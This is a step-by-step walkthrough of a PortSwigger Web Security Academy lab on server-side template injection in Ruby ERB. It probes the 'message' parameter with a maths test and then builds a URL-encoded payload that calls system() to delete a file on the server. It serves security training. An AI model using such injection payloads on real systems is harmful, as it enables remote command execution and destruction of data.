# [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

> Delete a file called `morale.txt` from Carlos's home folder, using a template injection bug.

## Find the entry point

- On the home page, click for more details on the first product.
- This sends a `message` parameter in the URL.
- That message gets shown as text: _"Unfortunately this product is out of stock"_.

## Check the ERB docs

- ERB is the template engine here.
- Its syntax to run code is: `<%= someExpression %>`
- Test with a simple maths payload

```
<%= 7*7 %>
```

## URL-encode it and add to the link

```
https://xxx.web-security-academy.net/?message=<%25%3d+7*7+%25>
```

> Swap in your own lab ID.

## Load the page

- If you see **49** instead of the normal message, it worked.
- This proves the server is running your code.

## Find a way to run system commands

- Ruby has a method called `system()`.
- It can run operating system commands.

## Build the real payload

```
<%= system("rm /home/carlos/morale.txt") %>
```

- URL-encode it and load it

```
https://xxx.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```
